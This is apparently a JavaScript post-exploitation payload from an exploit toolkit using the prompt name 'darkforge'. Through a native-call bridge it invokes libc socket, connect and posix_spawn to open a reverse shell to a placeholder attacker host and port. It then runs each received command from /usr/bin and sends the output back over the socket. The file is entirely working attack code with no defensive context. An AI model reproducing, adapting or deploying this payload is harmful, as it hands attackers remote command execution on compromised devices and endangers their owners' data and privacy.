(() => {
  var HOST = "__HOST__";
  var PORT = __PORT__;
  var sock = Number(Native.callSymbol("socket", 2, 1, 0));
  if (sock < 0) return "socket failed";
  var sa = Native.callSymbol("calloc", 1, 16);
  var sab = new ArrayBuffer(4);
  var sav = new DataView(sab);
  sav.setUint8(0, 16);
  sav.setUint8(1, 2);
  sav.setUint16(2, PORT, false);
  Native.write(sa, sab);
  var ip = Native.callSymbol("calloc", 1, 64);
  Native.writeString(ip, HOST);
  Native.callSymbol("inet_aton", ip, sa + 4n);
  Native.callSymbol("free", ip);
  if (Number(Native.callSymbol("connect", sock, sa, 16)) < 0) {
    Native.callSymbol("free", sa);
    Native.callSymbol("close", sock);
    return "connect failed";
  }
  Native.callSymbol("free", sa);
  var wb = Native.callSymbol("calloc", 1, 8192);
  var sw = function(s) {
    Native.writeString(wb, s);
    Native.callSymbol("write", sock, wb, s.length);
  };
  sw("darkforge# ");
  var rb = Native.callSymbol("calloc", 1, 4096);
  while (true) {
    var n = Number(Native.callSymbol("read", sock, rb, 4095));
    if (n <= 0) break;
    var cmd = Native.readString(rb, n).replace(/[\r\n]+$/, "");
    if (cmd === "exit") { sw("bye\n"); break; }
    if (!cmd) { sw("darkforge# "); continue; }
    var pp = Native.callSymbol("calloc", 1, 8);
    Native.callSymbol("pipe", pp);
    var fds = Native.read(pp, 8);
    var dv = new DataView(fds);
    var rd = dv.getInt32(0, true);
    var wr = dv.getInt32(4, true);
    Native.callSymbol("free", pp);
    var parts = cmd.split(/\s+/);
    var bin = parts[0];
    if (bin.indexOf("/") < 0) bin = "/usr/bin/" + bin;
    var binP = Native.callSymbol("calloc", 1, 256);
    Native.writeString(binP, bin);
    var argc = parts.length;
    var argv = Native.callSymbol("calloc", argc + 1, 8);
    for (var i = 0; i < argc; i++) {
      var a = Native.callSymbol("calloc", 1, parts[i].length + 1);
      Native.writeString(a, parts[i]);
      var ab = new ArrayBuffer(8);
      new DataView(ab).setBigUint64(0, a, true);
      Native.write(argv + BigInt(i * 8), ab);
    }
    var act = Native.callSymbol("calloc", 1, 256);
    Native.callSymbol("posix_spawn_file_actions_init", act);
    Native.callSymbol("posix_spawn_file_actions_adddup2", act, wr, 1);
    Native.callSymbol("posix_spawn_file_actions_adddup2", act, wr, 2);
    Native.callSymbol("posix_spawn_file_actions_addclose", act, rd);
    var pidp = Native.callSymbol("calloc", 1, 4);
    var ret = Native.callSymbol("posix_spawn", pidp, binP, act, 0, argv, 0);
    Native.callSymbol("close", wr);
    if (Number(ret) !== 0) {
      sw("spawn failed: " + ret + " (" + bin + ")\n");
    } else {
      var st = Native.callSymbol("calloc", 1, 4);
      Native.callSymbol("waitpid", -1, st, 0);
      var ob = Native.callSymbol("calloc", 1, 65536);
      var out = "";
      while (true) {
        var r = Number(Native.callSymbol("read", rd, ob, 65535));
        if (r <= 0) break;
        out += Native.readString(ob, r);
      }
      Native.callSymbol("free", ob);
      Native.callSymbol("free", st);
      if (out) sw(out);
    }
    Native.callSymbol("close", rd);
    Native.callSymbol("posix_spawn_file_actions_destroy", act);
    Native.callSymbol("free", act);
    Native.callSymbol("free", pidp);
    Native.callSymbol("free", binP);
    for (var j = 0; j < argc; j++) {
      var ap = new DataView(Native.read(argv + BigInt(j * 8), 8));
      Native.callSymbol("free", ap.getBigUint64(0, true));
    }
    Native.callSymbol("free", argv);
    sw("darkforge# ");
  }
  Native.callSymbol("close", sock);
  Native.callSymbol("free", wb);
  Native.callSymbol("free", rb);
  return "shell closed";
})()
